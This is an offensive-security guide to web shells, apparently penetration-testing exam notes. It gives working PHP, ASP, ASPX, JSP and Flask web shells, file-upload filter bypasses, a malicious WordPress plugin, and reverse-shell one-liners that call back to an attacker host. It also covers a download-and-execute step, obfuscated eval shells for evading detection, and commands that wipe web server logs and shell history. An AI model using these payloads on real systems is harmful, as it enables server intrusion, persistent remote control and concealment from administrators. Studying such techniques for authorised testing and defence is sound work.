# Web Shells - Complete Guide

## 📋 Overview

**Web shells** are scripts uploaded to a web server that provide remote command execution through a web interface. They're often the first step in compromising a web application.

**Key Advantage**: Works through HTTP/HTTPS, bypassing many firewall restrictions

---

## 🎯 When to Use Web Shells

### Ideal Scenarios
- ✅ File upload vulnerability found
- ✅ Web application allows file writes
- ✅ Reverse shells are blocked by firewall
- ✅ Need persistent access to web server
- ✅ Want to blend in with normal HTTP traffic

### Not Ideal When
- ❌ No file upload capability
- ❌ Strict file type validation
- ❌ Web Application Firewall (WAF) present
- ❌ File execution disabled

---

## 🔄 Web Shell Attack Workflow

```
┌─────────────────────────────────────────┐
│ 1. Identify Upload Functionality        │
│    └─ File upload forms, CMS, etc.      │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 2. Test Upload Restrictions             │
│    └─ File types, size, location        │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 3. Bypass Filters                       │
│    └─ Extension tricks, MIME types      │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 4. Upload Web Shell                     │
│    └─ Minimal, obfuscated shell         │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 5. Access and Execute                   │
│    └─ Navigate to uploaded file         │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 6. Upgrade to Reverse Shell             │
│    └─ More stable connection            │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 7. Clean Up (OPSEC)                     │
│    └─ Remove web shell artifacts        │
└─────────────────────────────────────────┘
```

---

## 🐚 Web Shell Types by Language

### PHP Web Shells

#### Minimal PHP Shell (Recommended for Exams)
```php
<?php system($_GET['cmd']); ?>
```

**Usage**:
```bash
http://target.com/shell.php?cmd=whoami
http://target.com/shell.php?cmd=id
http://target.com/shell.php?cmd=ls -la
```

#### One-Liner Variants
```php
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo exec($_GET['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>
```

#### PHP Shell with Output Formatting
```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

#### PHP Reverse Shell Launcher
```php
<?php
// Trigger reverse shell
$cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'";
shell_exec($cmd);
?>
```

#### Advanced PHP Shell (Feature-Rich)
```php
<?php
// Simple Web Shell with File Operations
if(isset($_GET['cmd'])) {
    echo "<pre>";
    $cmd = ($_GET['cmd']);
    system($cmd);
    echo "</pre>";
}

if(isset($_GET['upload'])) {
    $target = $_GET['upload'];
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
    echo "File uploaded to: " . $target;
}
?>

<html>
<body>
<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="text" name="upload" placeholder="Upload path">
    <input type="submit" value="Upload">
</form>
</body>
</html>
```

### ASP/ASPX Web Shells

#### Minimal ASP Shell
```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form("cmd")
If (szCMD <> "") Then
    Set oExec = oScript.Exec(szCMD)
    Response.Write(oExec.StdOut.ReadAll())
End If
%>
```

#### ASPX Shell
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request.QueryString["cmd"];
    if (cmd != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
```

#### Laudanum ASPX Shell
```bash
# Location on Kali
/usr/share/laudanum/aspx/shell.aspx

# Remember to modify:
# 1. Allowed IP addresses
# 2. Default credentials
# 3. Remove comments
```

#### Antak WebShell (PowerShell-based)
```bash
# Location on Kali
/usr/share/nishang/Antak-WebShell/

# Features:
# - PowerShell execution
# - File upload/download
# - Credential harvesting
# - Built-in obfuscation

# Modifications needed:
# 1. Change default credentials
# 2. Remove ASCII art (fingerprinting)
# 3. Customize authentication
```

### JSP Web Shells

#### Minimal JSP Shell
```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    BufferedReader reader = new BufferedReader(new InputStreamReader(in));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
```

#### JSP Reverse Shell
```jsp
<%@page import="java.lang.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%
    String cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'";
    Process p = Runtime.getRuntime().exec(cmd);
%>
```

### Python Web Shells (Flask/Django)

#### Flask Web Shell
```python
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/')
def shell():
    cmd = request.args.get('cmd', '')
    if cmd:
        output = subprocess.check_output(cmd, shell=True)
        return f"<pre>{output.decode()}</pre>"
    return "Web Shell Ready"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

---

## 🎭 Filter Bypass Techniques

### Extension Bypasses

#### Double Extension
```
shell.php.jpg
shell.php.png
shell.php.gif
```

#### Null Byte Injection (Older PHP)
```
shell.php%00.jpg
shell.php\x00.jpg
```

#### Case Variation
```
shell.PHP
shell.PhP
shell.pHp
```

#### Alternative Extensions
```
# PHP
.php3, .php4, .php5, .php7, .phtml, .phar

# ASP
.asp, .aspx, .cer, .asa, .config

# JSP
.jsp, .jspx, .jsw, .jsv, .jspf
```

#### Appended Extensions
```
shell.jpg.php
shell.png.php
```

### MIME Type Bypasses

#### Intercept with Burp Suite
```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Change to**:
```http
Content-Type: image/gif
Content-Type: image/jpeg
Content-Type: image/png
```

#### Magic Bytes (File Signature)
```php
GIF89a
<?php system($_GET['cmd']); ?>
```

```bash
# Add GIF header
echo 'GIF89a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

### Content Bypasses

#### Polyglot Files
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

#### Comment Obfuscation
```php
<?php
/*
 * Legitimate looking comment
 * Image processing script
 */
system($_GET['cmd']); // Hidden command
?>
```

---

## 🚀 Practical Upload Scenarios

### Scenario 1: Basic File Upload

```bash
# 1. Create minimal shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 2. Upload via web form
# 3. Find uploaded location
# Common paths:
# /uploads/
# /files/
# /images/
# /assets/
# /media/

# 4. Access shell
curl "http://target.com/uploads/shell.php?cmd=whoami"
```

### Scenario 2: Bypassing Extension Filter

```bash
# 1. Create shell with double extension
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# 2. Upload file
# 3. Try accessing with both extensions
curl "http://target.com/uploads/shell.php.jpg?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=id"
```

### Scenario 3: MIME Type Bypass with Burp

```bash
# 1. Create shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 2. Configure Burp proxy
# 3. Upload file and intercept request
# 4. Change Content-Type to image/gif
# 5. Forward request
# 6. Access uploaded shell
```

### Scenario 4: Magic Bytes Bypass

```bash
# 1. Create polyglot file
echo 'GIF89a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# 2. Upload file
# 3. Access shell
curl "http://target.com/uploads/shell.php?cmd=ls"
```

### Scenario 5: WordPress Plugin Upload

```bash
# 1. Create malicious plugin
mkdir malicious-plugin
cd malicious-plugin

# 2. Create plugin file
cat > malicious-plugin.php << 'EOF'
<?php
/*
Plugin Name: Malicious Plugin
Description: Web Shell
Version: 1.0
Author: Attacker
*/

if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF

# 3. Create readme
echo "Malicious Plugin" > readme.txt

# 4. Zip plugin
zip -r malicious-plugin.zip .

# 5. Upload via WordPress admin panel
# Plugins > Add New > Upload Plugin

# 6. Access shell
curl "http://target.com/wp-content/plugins/malicious-plugin/malicious-plugin.php?cmd=whoami"
```

---

## 🔄 Upgrading from Web Shell to Reverse Shell

### Method 1: Direct Reverse Shell Command

```bash
# On attacker - start listener
nc -nvlp 443

# Via web shell
http://target.com/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'

# URL encoded
http://target.com/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F443%200%3E%261%27
```

### Method 2: Download and Execute Reverse Shell

```bash
# On attacker - create reverse shell script
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/443 0>&1
EOF

# Start web server
python3 -m http.server 80

# Start listener
nc -nvlp 443

# Via web shell - download and execute
http://target.com/shell.php?cmd=wget http://10.10.14.5/shell.sh -O /tmp/shell.sh
http://target.com/shell.php?cmd=chmod +x /tmp/shell.sh
http://target.com/shell.php?cmd=/tmp/shell.sh
```

### Method 3: Python Reverse Shell

```bash
# Via web shell
http://target.com/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Method 4: PowerShell Reverse Shell (Windows)

```bash
# Via ASPX web shell
http://target.com/shell.aspx?cmd=powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 🛡️ Detection Evasion

### Obfuscation Techniques

#### Base64 Encoding
```php
<?php
$cmd = base64_decode($_GET['c']);
eval($cmd);
?>
```

**Usage**:
```bash
# Encode command
echo -n "system('whoami');" | base64
# Output: c3lzdGVtKCd3aG9hbWknKTs=

# Execute
http://target.com/shell.php?c=c3lzdGVtKCd3aG9hbWknKTs=
```

#### Variable Functions
```php
<?php
$f = $_GET['f'];
$c = $_GET['c'];
$f($c);
?>
```

**Usage**:
```bash
http://target.com/shell.php?f=system&c=whoami
http://target.com/shell.php?f=shell_exec&c=id
```

#### String Concatenation
```php
<?php
$a = 'sys';
$b = 'tem';
$c = $a . $b;
$c($_GET['cmd']);
?>
```

### Filename Obfuscation

```bash
# Use legitimate-looking names
config.php
settings.php
db_connect.php
cache.php
temp.php
```

### Minimal Footprint

```php
<?php @eval($_POST['x']); ?>
```

**Usage**:
```bash
curl -X POST http://target.com/shell.php -d "x=system('whoami');"
```

---

## 🧹 OPSEC and Cleanup

### During Engagement

#### Document Everything
```markdown
# Web Shell Upload Log

**File**: shell.php
**MD5**: 5d41402abc4b2a76b9719d911017c592
**Upload Time**: 2026-02-05 10:30:00
**Upload Path**: /var/www/html/uploads/shell.php
**Access URL**: http://target.com/uploads/shell.php
**Commands Executed**:
- whoami
- id
- ls -la /home
```

#### Minimize Commands
```bash
# Instead of multiple commands
http://target.com/shell.php?cmd=whoami
http://target.com/shell.php?cmd=id
http://target.com/shell.php?cmd=hostname

# Use single command
http://target.com/shell.php?cmd=whoami;id;hostname
```

### After Gaining Better Access

#### Remove Web Shell
```bash
# Via reverse shell
rm /var/www/html/uploads/shell.php

# Verify removal
ls -la /var/www/html/uploads/
```

#### Clear Logs
```bash
# Clear web server logs (if you have root)
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log
echo "" > /var/log/nginx/access.log
echo "" > /var/log/nginx/error.log

# Or just remove your entries
sed -i '/shell.php/d' /var/log/apache2/access.log
```

#### Clear Command History
```bash
history -c
rm ~/.bash_history
```

---

## 🎯 Common Web Shell Locations

### Linux
```
/var/www/html/
/var/www/html/uploads/
/var/www/html/images/
/var/www/html/assets/
/usr/share/nginx/html/
/opt/lampp/htdocs/
```

### Windows
```
C:\inetpub\wwwroot\
C:\xampp\htdocs\
C:\wamp\www\
C:\Program Files\Apache\htdocs\
```

### CMS-Specific
```
# WordPress
/wp-content/uploads/
/wp-content/themes/[theme]/
/wp-content/plugins/[plugin]/

# Joomla
/images/
/media/
/templates/[template]/

# Drupal
/sites/default/files/
/sites/all/modules/
```

---

## ⚠️ Common Errors and Solutions

### Error: "Parse error" in PHP
**Cause**: Syntax error in PHP code
**Solution**: Validate PHP syntax
```bash
php -l shell.php
```

### Error: "Permission denied"
**Cause**: Web server can't execute file
**Solution**: Check file permissions
```bash
chmod 644 shell.php  # Read/write for owner, read for others
```

### Error: "404 Not Found"
**Cause**: Wrong upload path
**Solution**: Enumerate upload directories
```bash
ffuf -u http://target.com/FUZZ/shell.php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

### Error: "Functions disabled"
**Cause**: PHP functions blacklisted
**Solution**: Try alternative functions
```php
# If system() is disabled, try:
shell_exec()
exec()
passthru()
popen()
proc_open()
```

---

## 💡 Pro Tips

1. **Start Minimal**
   ```php
   <?php system($_GET['cmd']); ?>
   ```
   Easier to bypass filters

2. **Always URL Encode**
   ```bash
   # Use Burp Decoder or
   python3 -c "import urllib.parse; print(urllib.parse.quote('bash -i >& /dev/tcp/10.10.14.5/443 0>&1'))"
   ```

3. **Test Locally First**
   ```bash
   php -S 0.0.0.0:8000
   # Test your shell before uploading
   ```

4. **Use POST Instead of GET**
   ```php
   <?php system($_POST['cmd']); ?>
   ```
   Less visible in logs

5. **Upgrade Immediately**
   ```bash
   # Don't rely on web shell
   # Upgrade to reverse shell ASAP
   ```

6. **Document Upload Locations**
   ```bash
   # Keep track of all uploaded files
   # For cleanup and reporting
   ```

7. **Check for WAF**
   ```bash
   # Test with harmless payload first
   http://target.com/shell.php?cmd=echo test
   ```

---

## 📚 Related Resources

- [File Upload Vulnerabilities](../02-Enumeration/Web-Enumeration/File-Upload.md)
- [Reverse Shells](./Reverse-Shells.md)
- [Shell Stabilization](./Shell-Stabilization.md)
- [Post-Exploitation](../04-Post-Exploitation/Situational-Awareness.md)
- [OPSEC Best Practices](../04-Post-Exploitation/OPSEC.md)

---

## 🔗 External Resources

- [PayloadsAllTheThings - Web Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [PHP Web Shells Collection](https://github.com/JohnTroony/php-webshells)
- [Laudanum Repository](https://github.com/jbarcia/laudanum)
- [Nishang - Antak WebShell](https://github.com/samratashok/nishang)

---

**Remember**: Web shells are powerful but leave artifacts. Always upgrade to a reverse shell and clean up after yourself!
